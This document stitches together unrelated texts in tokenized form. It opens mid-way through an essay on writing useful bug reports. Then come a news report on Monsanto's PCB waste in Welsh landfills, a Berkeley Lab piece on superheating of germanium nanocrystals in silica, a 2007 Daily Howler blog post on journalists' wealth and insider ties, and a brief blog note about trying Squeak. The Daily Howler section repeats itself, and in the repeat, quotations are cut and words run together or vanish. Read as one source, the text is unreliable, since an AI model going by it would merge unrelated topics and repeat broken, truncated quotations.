" What 's gone wrong ? " I 'd ask .
He would reply by telling me his current opinion of what needed to be fixed .
This worked fine when his current opinion was right .
It meant he 'd already done half the work and we were able to finish the job together .
It was efficient and useful .
But quite often he was wrong .
We would work for some time trying to figure out why some particular part of the program was producing incorrect data , and eventually we would discover that it was n't , that we'd been investigating a perfectly good piece of code for half an hour , and that the actual problem was somewhere else .
I 'm sure he would n't do that to a doctor .
" Doctor , I need a prescription for Hydroyoyodyne . "
People know not to say that to a doctor : you describe the symptoms , the actual discomforts and aches and pains and rashes and fevers , and you let the doctor do the diagnosis of what the problem is and what to do about it .
Otherwise the doctor dismisses you as a hypochondriac or crackpot , and quite rightly so .
It 's the same with programmers .
Providing your own diagnosis might be helpful sometimes , but always state the symptoms .
The diagnosis is an optional extra , and not an alternative to giving the symptoms .
Equally , sending a modification to the code to fix the problem is a useful addition to a bug report but not an adequate substitute for one .
If a programmer asks you for extra information , do n't make it up !
Somebody reported a bug to me once , and I asked him to try a command that I knew would n't work .
The reason I asked him to try it was that I wanted to know which of two different error messages it would give .
Knowing which error message came back would give a vital clue .
But he did n't actually try it - he just mailed me back and said " No , that wo n't work " .
It took me some time to persuade him to try it for real .
Using your intelligence to help the programmer is fine .
Even if your deductions are wrong , the programmer should be grateful that you at least tried to make their life easier .
But report the symptoms as well , or you may well make their life much more difficult instead .
" That 's funny , it did it a moment ago . "
Say " intermittent fault " to any programmer and watch their face fall .
The easy problems are the ones where performing a simple sequence of actions will cause the failure to occur .
The programmer can then repeat those actions under closely observed test conditions and watch what happens in great detail .
Too many problems simply do n't work that way : there will be programs that fail once a week , or fail once in a blue moon , or never fail when you try them in front of the programmer but always fail when you have a deadline coming up .
Most intermittent faults are not truly intermittent .
Most of them have some logic somewhere .
Some might occur when the machine is running out of memory , some might occur when another program tries to modify a critical file at the wrong moment , and some might occur only in the first half of every hour !
( I 've actually seen one of these . )
Also , if you can reproduce the bug but the programmer can't , it could very well be that their computer and your computer are different in some way and this difference is causing the problem .
I had a program once whose window curled up into a little ball in the top left corner of the screen , and sat there and sulked .
But it only did it on 800x600 screens ; it was fine on my 1024x768 monitor .
The programmer will want to know anything you can find out about the problem .
Try it on another machine , perhaps .
Try it twice or three times and see how often it fails .
If it goes wrong when you 're doing serious work but not when you 're trying to demonstrate it , it might be long running times or large files that make it fall over .
Try to remember as much detail as you can about what you were doing to it when it did fall over , and if you see any patterns , mention them .
Anything you can provide has to be some help .
Even if it 's only probabilistic ( such as " it tends to crash more often when Emacs is running " ) , it might not provide direct clues to the cause of the problem , but it might help the programmer reproduce it .
Most importantly , the programmer will want to be sure of whether they 're dealing with a true intermittent fault or a machine - specific fault .
They will want to know lots of details about your computer , so they can work out how it differs from theirs .
A lot of these details will depend on the particular program , but one thing you should definitely be ready to provide is version numbers .
The version number of the program itself , and the version number of the operating system , and probably the version numbers of any other programs that are involved in the problem .
" So I loaded the disk on to my Windows . . . "
Writing clearly is essential in a bug report .
If the programmer can't tell what you meant , you might as well not have said anything .
I get bug reports from all around the world .
Many of them are from non-native English speakers , and a lot of those apologise for their poor English .
In general , the bug reports with apologies for their poor English are actually very clear and useful .
All the most unclear reports come from native English speakers who assume that I will understand them even if they do n't make any effort to be clear or precise .
Be specific .
If you can do the same thing two different ways , state which one you used .
" I selected Load " might mean " I clicked on Load " or " I pressed Alt - L " .
Say which you did .
Sometimes it matters .
Be verbose .
Give more information rather than less .
If you say too much , the programmer can ignore some of it .
If you say too little , they have to come back and ask more questions .
One bug report I received was a single sentence ; every time I asked for more information , the reporter would reply with another single sentence .
It took me several weeks to get a useful amount of information , because it turned up one short sentence at a time .
Be careful of pronouns .
Do n't use words like " it " , or references like " the window " , when it 's unclear what they mean .
Consider this : " I started FooApp .
It put up a warning window .
I tried to close it and it crashed . "
It is n't clear what the user tried to close .
Did they try to close the warning window , or the whole of FooApp ?
It makes a difference .
Instead , you could say " I started FooApp , which put up a warning window .
I tried to close the warning window , and FooApp crashed . "
This is longer and more repetitive , but also clearer and less easy to misunderstand .
Read what you wrote .
Read the report back to yourself , and see if you think it 's clear .
If you have listed a sequence of actions which should produce the failure , try following them yourself , to see if you missed a step .
Summary
The first aim of a bug report is to let the programmer see the failure with their own eyes .
If you can't be with them to make it fail in front of them , give them detailed instructions so that they can make it fail for themselves .
In case the first aim does n't succeed , and the programmer can't see it failing themselves , the second aim of a bug report is to describe what went wrong .
Describe everything in detail .
State what you saw , and also state what you expected to see .
Write down the error messages , especially if they have numbers in .
When your computer does something unexpected , freeze .
Do nothing until you 're calm , and do n't do anything that you think might be dangerous .
By all means try to diagnose the fault yourself if you think you can , but if you do , you should still report the symptoms as well .
Be ready to provide extra information if the programmer needs it .
If they did n't need it , they would n't be asking for it .
They are n't being deliberately awkward .
Have version numbers at your fingertips , because they will probably be needed .
Write clearly .
Say what you mean , and make sure it can't be misinterpreted .
Above all , be precise .
Programmers like precision .

Evidence has emerged that the Monsanto chemical company paid contractors to dump thousands of tonnes of highly toxic waste in British landfill sites , knowing that their chemicals were liable to contaminate wildlife and people .
Yesterday the Environment Agency said it had launched an inquiry after the chemicals were found to be polluting underground water supplies and the atmosphere 30 years after they were dumped .
According to the agency it could cost up to £ 100 m to clean up a site in south Wales that has been called " one of the most contaminated " in the country .
A previously unseen government report read by the Guardian shows that 67 chemicals , including Agent Orange derivatives , dioxins and PCBs which could have been made only by Monsanto , are leaking from one unlined porous quarry that was not authorised to take chemical wastes .
The Brofiscin quarry on the edge of the village of Groesfaen , near Cardiff , erupted in 2003 , spilling fumes over the surrounding area , but the community has been told little about the real condition of what is in the pit .
Yesterday the government was criticised for failing to publish information about the scale and exact nature of this contamination .
Douglas Gowan , a pollution consultant who produced the first official report into the Brofiscin quarry in 1972 after nine cows on a local farm died of poisoning , said : " The authorities have known about the situation for years , but have done nothing .
There is evidence of not only negligence and utter incompetence , but cover - up , and the problem has grown unchecked . "
Much of the new information about Monsanto 's activities in Britain in the 1960s and early 1970s has emerged from court papers filed in the US and previously unseen internal company documents .
They show how the company knew from 1965 onwards that the PCBs - polychlorinated biphenyls used mainly as flame retardants and insulaters - manufactured in the US and at its plant in Newport , south Wales , under the trade name Aroclor , were accumulating in human milk , rivers , fish and seafood , wildlife and plants .
The documents show that in 1953 , company chemists tested the PCB chemicals on rats and found that they killed more than 50 % with medium - level doses .
However , it continued to manufacture PCBs and dispose of the wastes in south Wales until 1977 , more than a decade after evidence of widespread contamination of humans and the environment was beyond doubt .
A high - level committee within the company was given the task in 1968 of assessing Monsanto 's options and reported contamination in human milk , fish , birds and wildlife from around the world , including Britain .
" In the case of PCBs the company is faced with a barrage of adverse publicity ... it will be impossible to deny the presence and persistence of Aroclors .
The public and legal pressures to eliminate or prevent global contamination are inevitable and probably cannot be contained successfully , " the committee reported .
The report , which was shown to only 12 people , said : " The alternatives are [ to ] say and do nothing ; create a smokescreen ; immediately discontinue the manufacture of Aroclors ; respond responsibly , admitting growing evidence of environmental contamination ... "
A scrawled note at the end of the document says : " The Big Question !
What do we tell our customers ... try to stay in business or help customer 's clean up their use ? "
Monsanto stopped producing PCBs in the US in 1971 , but the UK government , which knew of the dangers of PCBs in the environment in the 1960s , allowed their production in Wales until 1977 .
Yesterday Monsanto , which has split into several corporate entities since 1997 , said in a statement : " On behalf of [ former parent company ] Pharmacia Corp , Monsanto is handling issues related to the historical manufacture of PCBs in Wales .
We continue to work with the Wales Department of Environment and other regulatory bodies to resolve these issues .
A thorough review ... will show that Pharmacia did inform its contractors of the nature of wastes prior to disposal , and that Pharmacia did not dump wastes from its own vehicles . "
Solutia , the spin - off from Monsanto which now owns the Newport site , said it was giving Monsanto and the regulatory agencies " information as requested " .
The Environment Agency Wales said it was investigating the contents of the site : " This is one of the most contaminated sites in Wales and it is a priority to remediate because it is so close to habitations , " said John Harrison , the agency 's manager of the Taff / Ely region .
" There is ground water pollution , but we do not think at present there is any danger to human health .
We have spent about £ 800,000 so far investigating the tip .
Our legal team is gathering all the evidence and we are trying to apportion costs . "
Scientists at the Department of Energy 's Lawrence Berkeley National Laboratory have discovered that nanocrystals of germanium embedded in silica glass do n't melt until the temperature rises almost 200 degrees Kelvin above the melting temperature of germanium in bulk .
What 's even more surprising , these melted nanocrystals have to be cooled more than 200 K below the bulk melting point before they resolidify .
Such a large and nearly symmetrical " hysteresis " — the divergence of melting and freezing temperatures above and below the bulk melting point — has never before been observed for embedded nanoparticles .
Phase transitions between solid and liquid or liquid and vapor are familiar phenomena in the everyday world , for example between solid water ice , liquid water , and water vapor , or steam .
Eugene Haller of Berkeley Lab's Materials Sciences Division ( MSD ) , who is also a professor of materials science at the University of California at Berkeley , uses an epicurean example : " When a solid piece of chocolate melts in the mouth , it releases a burst of flavors . "
Haller explains that beyond broad scientific interest , the properties of germanium nanoparticles embedded in amorphous silicon dioxide matrices have promising applications .
" Germanium nanocrystals in silica have the ability to accept charge and hold it stably for long periods , a property which can be used in improved computer memory systems .
Moreover , germanium dioxide ( germania ) mixed with silicon dioxide ( silica ) offers particular advantages for forming optical fibers for long - distance communication . "
To exploit these properties means understanding the melting / freezing transition of germanium under a variety of conditions .
The researchers embedded nanoparticles averaging 2.5 nanometers in diameter ( a nanometer is a billionth of a meter ) in silica .
What they encountered when they heated and cooled this system was completely unexpected .
Their results are published in the October 13 , 2006 issue of Physical Review Letters .
How Materials Melt and Freeze
For almost a hundred years , theorists and experimenters have studied how the size of a crystal affects melting and freezing , the transition between the liquid and solid state of a material .
For most crystalline materials , the smaller the size , the lower the melting temperature .
The melting temperature of a free - standing metal or semiconductor nanocrystal , typically comprised of a few hundred to a few thousand atoms , may be more than 300 degrees Kelvin below the melting temperature of the same material in bulk .
The reason for this , says Joel Ager of MSD , a coauthor of the Physical Review Letters report , is that " the smaller a solid object gets , the larger the percentage of its atoms residing at the surface .
If it keeps shrinking , eventually it 's practically all surface . "
Inside a crystalline solid the atoms are constrained by the crystal lattice , " but at the surface the atoms have more freedom to move .
As the temperature increases , they begin to vibrate ; when the vibration of the surface atoms reaches a certain percentage of the bond length between them , melting begins and then starts to propagate through the solid . "
advertisement
Beginning in the 1950s , methods for accurately measuring the melting of crystalline solids were developed , and at the same time theories of melting and freezing became more sophisticated .
" Melting and freezing begin at the interface between the surface of the solid and its surroundings , " says theorist Daryl Chrzan of MSD , also a professor of materials science at UC Berkeley .
" The solid phase has a certain free energy , the liquid another , vapor yet another , and interfaces between these phases have their own characteristic energies .
The likelihood of a phase transition occurring in one direction or the other can be calculated based on the free energies of the material phases themselves and their interface energies , taking into account volume , geometry , density , and other factors . "
For most materials , interface energies between solid and vapor — for example , a bar of gold in air — favor the formation of a liquid surface layer as the temperature increases , which continues to grow until the entire object is melted ; this liquid layer forms more readily at lower temperatures as the proportion of surface to volume increases .
Haller notes that " if you make free - standing nanoparticles of gold small enough , they melt at room temperature . "
Embedded nanocrystals occasionally behave differently , however .
Superheating has been observed in the case of nanocrystals embedded in a crystalline matrix , for example nanoparticles of lead embedded in an aluminum matrix .
This is attributed to the lattice structures of the two crystals " locking up , " suppressing the vibration of the nanoparticles ' surface atoms that would lead to melting .
But germanium nanocrystals in silica glass are quite a different matter : the glass matrix has no lattice structure to lock with the surface of the germanium crystal .
Ager says that " because there was no lattice structure in the matrix , we had naively expected the germanium crystals to behave more like free - standing nanoparticles — that is , we expected the melting temperature to be much less than in bulk germanium .
Instead , to our surprise , germanium nanocrystals in glass had to be superheated to melt . "
That was only the first surprise .
In bulk materials , the interface energy between solid and vapor , which allows the transition from solid to liquid at the melting temperature , creates a roadblock in the opposite direction , an energy barrier to freezing .
advertisement
" It always costs energy to form a surface , " says Chrzan .
" In the bulk , in fact , it 's possible to supercool many materials and maintain them in a liquid state well above their normal freezing / melting point .
In order to freeze , a material must overcome that slight energy barrier so as to form a critical solid nucleus . "
In the case of germanium nanocrystals embedded in glass , the same large interface - energy barrier that leads to superheating before the solid crystal can melt means the melted inclusions must be supercooled before they freeze .
" While these results were unexpected , " Chrzan says , " it turns out they can be explained in a straightforward way .
We modified the traditional theory of nucleation developed by David Turnbull in the 1950s .
Even though in our system , the ratio of surface to volume is far greater than in the bulk materials Turnbull was working with — and even though , instead of a solid - vapor interface , we are working with a solid - glass interface — we saw that we could apply his theory in this new regime . "
Says Chrzan , " Typically in bulk materials , surface premelting means there 's no need for nucleation before melting occurs .
But in our case , the large proportional surface area of the germanium nanoparticles , plus the interface energy of the solid - glass interface , creates a calculable nucleation barrier in both directions . "
As the nanoparticle heats up , a liquid nucleus , its lens shape partly determined by the confining spherical cavity in the glass , must achieve a critical size before it can spread and entirely melt the nanocrystal .
Conversely , as the temperature drops , a solid nucleus forms and starts to grow from the surface of the liquid sphere — a nucleus that will eventually cause the entire nanometer - sized liquid globule to freeze into a solid crystal .
The Turnbull theory as modified by Chrzan correctly predicted the temperatures at which both events would occur .
Manipulation Under the Microscope
To perform these experiments , the researchers made silica glass samples 500 nanometers thick by oxidizing pure silicon in steam .
They implanted germanium ions in the amorphous silicon and then annealed the sample at 900 degrees Celsius to form nanocrystals .
The transparent glass allowed characterization of the embedded nanocrystals by Raman spectroscopy ; the glass was also readily etched away for examination of the nanocrystals with an atomic force microscope .
Heating and cooling of the samples were performed in situ in a transmission electron microscope at the Department of Energy 's National Center for Electron Microscopy , based at Berkeley Lab .
By thinning the samples to less than 300 nanometers and looking straight through them with the microscope 's electron beam ( with the beam itself masked off so as not to hit the camera ) , the researchers could observe the electron diffraction rings produced by the crystal lattices of the embedded particles .
When the particles began to melt , the diffraction rings weakened and finally vanished , allowing precise measurement of the temperature at which the embedded particles melted .
As the temperature was lowered again , the appearance of the diffraction rings signaled resolidification .
" Melting and freezing points for materials in bulk have been well understood for a long time , " says Haller , " but whenever an embedded nanoparticle 's melting point goes up instead of down , it requires an explanation .
With our observations of germanium in amorphous silica and the application of a classical thermodynamic theory that successfully explains and predicts these observations , we 've made a good start on a general explanation of what have until now been regarded as anomalous events . "

Daily Howler : Gregory threw a baby shower .

R UBBING SHOULDERS !
Gregory threw a baby shower .
But why was Chertoff there ?
// link // print // previous // next //
THURSDAY , APRIL 26 , 2007
THE SECOND TIME AROUND : , Howard Kurtz discusses the press corps new approach to White House hopeful John McCain .
 Is the honeymoon really over ?  the headline asks .
Early on , Kurtz recalls the shape of McCains press coverage during Campaign 2000 : KURTZ ( 4/26/07 ) : Seven years ago , as reporters rode around this first primary state on McCain 's campaign bus , chatting up the candidate for hours on end , a romance was born .
" Journalists go weak in the knees around the guy , " wrote Slate 's Jacob Weisberg , who admitted joining the swoon .
" McCain is easier to get access to than a Hong Kong hooker , " a Time cover story announced .
Ari Fleischer , the spokesman for candidate George W. Bush , complained that " John McCain is a media darling . "
Fair enough .
But that barely begins to capture the foolishness — and the groaning lack of professionalism — which characterized the press corps swoon that year .
And make no mistake — once McCain was eliminated in March 2000 , the romance was transferred to the Bush campaign plane , where Bush was soon mounting his charm offensive .
No , that romance wasnt as strong as the one which had flourished on McCains big white bus .
But the contrast with the press corps trashing of Gore was plain for all to see .
This morning , we chuckled at one part of Kurtzs piece .
He recorded something McCain said yesterday , up in New Hampshire .
He had just taken questions from reporters : KURTZ ( 4/26/07 ) :
As the lines of inquiry were exhausted , McCain allowed that he is superstitious ( he wo n't pick up pennies if they 're tails side up ) and traced that to his days as a fighter pilot .
We note again what weve noted before — McCains ability to mention his Vietnam service in every conceivable circumstance .
But Kurtz is right — that romance has cooled .
Seven years ago , most reporters ( not Kurtz — lets be fair ) would have rendered that passage like this : REVISED PASSAGE ( CAMPAIGN 2000 EDITION ) :
As the lines of inquiry were exhausted , McCain allowed that he is superstitious ( he wo n't pick up pennies if they 're tails side up ) .
Although he hates to discuss Vietnam , he reluctantly traced his superstition to his days as a fighter pilot .

Special report : Gregorys world !
PART 3 — RUBBING SHOULDERS : No , it is nt just David Gregory , a better - than - average TV reporter .
At the tippity - top of our Washington press corps , many people make huge chunks of money ( see
That said , wed guess that most voters dont think of such things when they ponder the work of their press corps .
After all , how many NBC viewers have any idea of the massive dough being earned by Gregory and his superstar wife , Beth Wilkinson ?
The press corps rarely discusses the press corps , and they definitely shy from issues of wealth .
They tend to get all lifestyles - of - the - rich - and - famous on us — when it comes to people in other professions .
But they also tend to be very quiet — when it comes to the wealth of their own .
When Tim Russert wrote Big Russ , for example , he went on and on about the good judgment he enjoys because of his Buffalo boyhood .
But wouldnt you know it ?
Pressed for time , he forgot to mention the Nantucket home where he now summers ( and possibly autumns ) .
In 2003 , he had told the Washingtonians Sallie Brady how much he loves the sprawling gray - shingled house , with rooftop sundeck and cutting garden to which he repairs on the rose - envined isle .
But surprise !
He never mentioned this world in his book — a book which would be sold to the masses — and he forgot to mention the fact that his former owner , Jack Welch , was also found there on the island .
Indeed , no one promotes its big players  working - class image in quite the way NBC News does ; Russert is always talking up Buffalo , and Brian Williams is ruthlessly programmed to mention his vast love for NASCAR .
But the press corps  wealth is rarely discussed , except in the Washingtonian , a publication for Washingtons swells .
Washingtonian readers can handle this stuff .
Elsewhere , your press corps modesty keeps them from mentioning the wealth — wealth which does affect some of their work .
( By the way , readers : John Edwards paid too much for his house !
Do you see how easy life can be for D.C. pundits when they stifle talk of their own wealth ? )
But theres something else that rarely gets mentioned in mass publications — the press corps insider connections .
Indeed , when such connections get mentioned at all , such discussions can be rather guarded .
Example : This passage by Howard Kurtz in KURTZ ( 3/14/06 ) :
In his personal life , Gregory also rubs shoulders with newsmakers .
At a baby shower for his wife before their son Max , now 3 , was born , Michael Chertoff , then an assistant attorney general , disappeared into another room with a Justice Department colleague while Gregory tried to figure out what was going on .
It turned out they were finalizing a plea agreement with John Walker Lindh , the American captured while fighting for the Taliban .
Wilkinson last month became general counsel of Fannie Mae , and the couple now have 8 - month - old twins as well .
Say what ?
What in the world was Michael Chertoff doing at Wilkinsons baby shower ?
Chertoff , of course , has played many roles in Republican politics over the past fifteen years .
Today , hes head of Homeland Security .
But back in the 1990s , he was special counsel for the DAmato Senate committee which investigated — or pretended to investigate — a wide range of allegations concerning Bill Clinton and everyone else hed ever known .
Chertoff may be the worlds nicest guy — we dont know .
But in those days , he played it tough ; when he was nominated for a judgeship in 2003 , Hillary Clinton was the sole dissenting vote in the Senate , saying that junior White House staffers had been very badly treated  during the Chertoff probes .
( In 2001 , Clinton was also the lone dissenter when the Senate confirmed Chertoff to head the Justice Departments criminal division . )
Chertoff had been a rough partisan player .
Now , he was rubbing shoulders  with Gregory — at his wifes baby shower !
But why in the world was he doing that ?
Kurtz , like the Sphinx , didnt tell .
In fact , it seems that Chertoff may have played a key role in Wilkinsons career — although , as in the case of those Nantucket shacks , you re only going to hear such things in the Washingtonian .
In April 2005 , Kim Eisler described shouts of joy at the 180 - lawyer Washington office of Latham & Watkins  when Bush named Chertoff to head Homeland Security .
Latham , of course , was Wilkinsons firm — but Chertoff had been a partner there too .
According to Eisler , Wilkinson stood to gain from her colleagues nomination : EISLER ( 4/05 ) : Latham made a serious commitment to identifying itself with terrorism issues when it hired Justice Department prosecutor Beth Wilkinson in 1998 to join a stable of attorneys best known in Washington for the environmental practice of former Interior secretary Bruce Babbitt .
Wilkinson had earned her antiterrorism stripes as a key member of the prosecution team that won a conviction of Oklahoma City bomber Timothy McVeigh .
She is married to NBC White House correspondent David Gregory .
Now , even though Chertoff will be legally restrained from favoring his former firm , Wilkinson stands ready to benefit by her past associations with Chertoff .
Eisler didnt explain how Wilkinson stood to benefit from this connection .
But one year later , he returned to the question in a piece for his magazines POWER PLAYERS  section .
According to Eisler , influence over Bush Admin legal appointments was now being wielded by Chertoff and Latham .
Let s leave out the mumbo- jumbo and take you straight to the chase : EISLER ( 4/06 ) : After the debacle of naming Harriet Miers to the Supreme Court , it was Chertoff who persuaded Bush to settle on Samuel Alito .
Chertoff and Alito are good friends who served together both in the New Jersey US Attorney 's Office and on the same federal circuit court .
Chertoff 's influence hardly stops there .
Alice Fisher , the chief of Justice 's criminal division , once worked for Chertoff .
So did Noel Hillman , recently appointed to the federal bench .
So did Julie Myers , the new head of Homeland Security 's Immigration and Customs office .
Another former Latham lawyer is Chris Cox , the new chair of the Securities and Exchange Commission .
Legal Times found 11 former Chertoff associates in key administration posts .
A connection to the Latham firm , Chertoff , or both is about the best thing a government - job seeker can have on a résumé .
Top lawyer and former Latham partner Beth Wilkinson , who knows Chertoff from both the firm and the Justice Department , was named general counsel of struggling home - mortgage giant Fannie Mae .
Wilkinson 's strengths include her Latham connections and her professional friendship with Chertoff .
At the Justice Department , she was also an expert in terrorism .
Wilkinson is more than occupied with her new job and raising a set of young twins with husband David Gregory , NBC 's prickly White House correspondent .
Otherwise , insiders say , Chertoff 's successor at Homeland Security might have well made it two in a row for Latham .
Yikes !
Unnamed insiders  had even told Eisler that Wilkinson might have been a contender for Homeland Security chief !
We find that rather hard to believe , given her husbands prickly  ways .
But Eisler provided some background to the shoulder - rubbing which Kurtz had already described .
Not that theres anything wrong with it !
But big Washington journos live in a world of wealth and insider connection — a world that seldom gets discussed in the press corps .
Your press corps knows to play by the rules !
It rarely discusses those Nantucket swells — or the shoulder - rubbing that may transpire among its biggest players .
They cluck about this — in other professions .
They clam when it comes to their own .
The press corps rarely discussed the press corps .
You have to hunt to find the tales of Gwen Ifill providing home cooking for Condi ( see Meet the Press , about the clairvoyance he had displayed at Don Rumsfelds Christmas party ( see Washingtonian — for example , to learn the way major journos form religious ties with the Big Major Pols they re supposed to be covering .
See Washingtonian .
Are you troubled at all by such press-pol connections ?
The public doesnt have to worry !
Unless they read the Washingtonian , they wont read inside dope of that kind .
Gregorys work has been better — in some ways , much better — than that of some of his NBC colleagues .
But at the upper end of your Washington press corps , big players are swimming in wealth and connection .
And yes , this sometimes affects their judgment — and , in the process , it may change your lives !
Tomorrow , a new piece of Howler history !
Omigod !
How very strange !
The pundit gang at MSNBC flipped at a critical juncture !
THEN , THERES THIS STUFF TOO :
Then , you get to this stuff too .
Wilkinson may have presented a very good case .
But we felt we had to tattle : EISLER ( 12/04 ) :
At the Justice Department a decade ago , Wilkinson gained experience in trial work and expertise in terrorism through her work on the prosecution of Oklahoma City bomber Timothy McVeigh .
Both skills are now valuable in her private practice .
Her trial skills place her in the top tier of the nation 's litigators , the lawyers who actually go into court and fight the battles .
When Philip Morris needed to get a $ 28 - billion judgment in favor of a smoker reversed , it skipped over many older male attorneys and hired Wilkinson .
In the second trial , the tobacco giant was cleared of negligence .
Wilkinson has advised Ford Motor on its tire problems and was attorney for the Salt Lake City Organizing Committee after allegations that bribery played a role in bringing the Olympics to Utah .
In her early forties , Wilkinson is married to NBC White House correspondent David Gregory .
Eisler may have slightly misdescribed Wilkinsons work for Philip Morris ( were not entirely certain ) .
But she did win several big cases for the company (
TOMORROW — PART 4 : Even we had to ask ourselves : Did Jack make a call ?
In this mornings Post , Howard Kurtz discusses the press corps new approach to White House hopeful John McCain .
 Is the honeymoon really over ?  the headline asks .
Early on , Kurtz recalls the shape of McCains press coverage during Campaign 2000 : Fair enough .
But that barely begins to capture the foolishness — and the groaning lack of professionalism — which characterized the press corps swoon that year .
And make no mistake — once McCain was eliminated in March 2000 , the romance was transferred to the Bush campaign plane , where Bush was soon mounting his charm offensive .
No , that romance wasnt as strong as the one which had flourished on McCains big white bus .
But the contrast with the press corps  trashing of Gore was plain for all to see .
This morning , we chuckled at one part of Kurtzs piece .
He recorded something McCain said yesterday , up in New Hampshire .
He had just taken questions from reporters :
We note again what weve noted before — McCains ability to mention his Vietnam service in every conceivable circumstance .
But Kurtz is right — that romance has cooled .
Seven years ago , most reporters ( not Kurtz — lets be fair ) would have rendered that passage like this :
What was it like for McCain during Campaign 2000 ?
See THE DAILY HOWLER , 2/25/00 .
It s part 1 of a four - part report .
No , it is nt just David Gregory , a better - than - average TV reporter .
At the tippity - top of our Washington press corps , people make huge chunks of money ( see THE DAILY HOWLER , 4/25/07 ) .
And yes , this access to massive wealth almost surely has an effect on the way the news gets presented .
It s human nature , after all .
People will do a lot of things to haul down massive salaries ; they may adopt the outlooks and world - views of their corporate owners and upper - end peers , for example .
And the world inevitably starts looking different to many people who haul in big dough .
We thought Margaret Carlson captured this problem in her fall 2000 chat with Don Imus .
When people earn such massive salaries , politics will sometimes start looking different .
When massive wealth provides a firewall against societys basic problems , your nations politics can start to seem like fun ,  entertainment  and sport .
That said , wed guess that most voters dont think of such things when they ponder the work of their press corps .
After all , how many NBC viewers have any idea of the massive dough being earned by Gregory and his superstar wife , Beth Wilkinson ?
The press corps rarely discusses the press corps , and they definitely shy from issues of wealth .
They tend to get all lifestyles - of - the - rich - and - famous on us — when it comes to people inprofessions .
But they also tend to be very quiet — when it comes to the wealth of their own .
When Tim Russert wrote , for example , he went on and on about the good judgment he enjoys because of his Buffalo boyhood .
But wouldnt you know it ?
Pressed for time , he forgot to mention the Nantucket home where he now summers ( and possibly autumns ) .
In 2003 , he had told the Sallie Brady how much he loves the sprawling gray - shingled house , with rooftop sundeck and cutting garden to which he repairs on the rose - envined isle .
But surprise !
He never mentioned this world in his book — a book which would be sold to the masses — and he forgot to mention the fact that his former owner , Jack Welch , was also found there on the island .
Indeed , no one promotes its big players  working - class image in quite the way NBC News does ; Russert is always talking up Buffalo , and Brian Williams is ruthlessly programmed to mention his vast love for NASCAR .
But the press corps is rarely discussed , except in the , a publication for Washingtons swells .
readers can handle this stuff .
Elsewhere , your press corps modesty keeps them from mentioning the wealth — wealth which does affect some of their work .
( By the way , readers : Do you see how easy life can be for D.C. pundits when they stifle talk of their own wealth ? )
But theres something else that rarely gets mentioned in mass publications — the press corps insider connections .
Indeed , when such connections get mentioned at all , such discussions can be rather guarded .
Example : This passage by Howard Kurtz in last years profile of Gregory Say what ?
What in the world was Michael Chertoff doing at Wilkinsons baby shower ?
Chertoff , of course , has played many roles in Republican politics over the past fifteen years .
Today , hes head of Homeland Security .
But back in the 1990s , he was special counsel for the DAmato Senate committee which investigated — or pretended to investigate — a wide range of allegations concerning Bill Clinton and everyone else hed ever known .
Chertoff may be the worlds nicest guy — we dont know .
But in those days , he played it tough ; when he was nominated for a judgeship in 2003 , Hillary Clinton was the sole dissenting vote in the Senate , saying that junior White House staffers had been very badly treated  during the Chertoff probes .
( In 2001 , Clinton was also the lone dissenter when the Senate confirmed Chertoff to head the Justice Departments criminal division . )
Chertoff had been a rough partisan player .
Now , he was rubbing shoulders  with Gregory — at his wifes baby shower !
But why in the world was he doing that ?
Kurtz , like the Sphinx , didnt tell .
In fact , it seems that Chertoff may have played a key role in Wilkinsons career — although , as in the case of those Nantucket shacks , you re only going to hear such things in the .
In April 2005 , Kim Eisler described shouts of joy at the 180 - lawyer Washington office of Latham & Watkins  when Bush named Chertoff to head Homeland Security .
Latham , of course , was Wilkinsons firm — but Chertoff had been a partner there too .
According to Eisler , Wilkinson stood to gain from her colleagues nomination : Eisler didnt explainWilkinson stood to benefit from this connection .
But one year later , he returned to the question in a piece for his magazines POWER PLAYERS  section .
According to Eisler , influence over Bush Admin legal appointments was now being wielded by Chertoff and Latham .
Let s leave out the mumbo- jumbo and take you straight to the chase : Yikes !
Unnamed insiders  had even told Eisler that Wilkinson might have been a contender for Homeland Security chief !
We find that rather hard to believe , given her husbands prickly  ways .
But Eisler provided some background to the shoulder - rubbing which Kurtz had already described .
Not that theres anything wrong with it !
But big Washington journos live in a world of wealth and insider connection — a world that seldom gets discussed in the press corps .
Your press corps knows to play by the rules !
It rarely discusses those Nantucket swells — or the shoulder - rubbing that may transpire among its biggest players .
They cluck about this — in other professions .
They clam when it comes to their own .
The press corps rarely discussed the press corps .
You have to hunt to find the tales of Gwen Ifill providing home cooking for Condi ( see THE DAILY HOWLER , 8/11/03 ) .
Of Ted Koppel driving over to let Colin Powell check out his fast new cars ( see THE DAILY HOWLER , 10/19/04 ) .
Sometimes , of course , they cant help themselves , as when Russert boasted , on , about the clairvoyance he had displayed at Don Rumsfelds Christmas party ( see THE DAILY HOWLER , 12/16/03 ) .
But usually you have to turn to the — for example , to learn the way major journos form religious ties with the Big Major Pols they re supposed to be covering .
See THE DAILY HOWLER , 4/11/05 .
Scroll down to the long Matuswo excerpt from the June 03 Are you troubled at all by such press-pol connections ?
The public doesnt have to worry !
Unless they read thethey wont read inside dope of that kind .
Gregorys work has been better — in some ways , much better — than that of some of his NBC colleagues .
But at the upper end of your Washington press corps , big players are swimming in wealth and connection .
And yes , this sometimes affects their judgment — and , in the process , it may change your lives !
Tomorrow , a new piece of Howler history !
Omigod !
How very strange !
The pundit gang at MSNBC flipped at a critical juncture !
Then , you get to this stuff too .
Wilkinson may have presented a very good case .
But we felt we had to tattle :
Eisler may have slightly misdescribed Wilkinsons work for Philip Morris ( were not entirely certain ) .
But she did win several big cases for the company ( click here , keep reading ) , and her approach to these cases has been applauded in industry journals .
Again , she may have had the better case ; a lot of tobacco suits are fairly shaky .
But at the top of the national press corps , a lot of shoulders are being rubbed .
Due to the modesty of the press corps , news consumers have little real clue about the sweep of these connections .
Even we had to ask ourselves : Did Jack make a call ?

This is a question I ’m currently interested in knowing the answer to .
I do n’t know much about Smalltalk or Squeak unfortunately , but from what I do know , it seems like a good fit for the latest idea I have .
The primary advantage over other environments I know , is that the image is available at all times .
If an image receives a message it ca n’t handle because of a programming error , it can enter the debugger and wait for me to come along and debug it .
I think that a decent Common Lisp implementation will offer me similar functionality .
Unfortunately , playing around with a new language for a couple of days gives a very limited idea of what it will be like to use it to develop a medium - sized application .
For me , during the initial stage of investigation , it is very important to know whether it is worth taking the time with very quickly so that as little time is wasted as possible .
Unfortunately , Squeak is a little harder to get to grips with than most languages I am familiar with as it is necessary to learn the IDE at the same time as the language .
It is not possible ( as far as I know ) to simply enter a hello world program into a textfile and execute it .
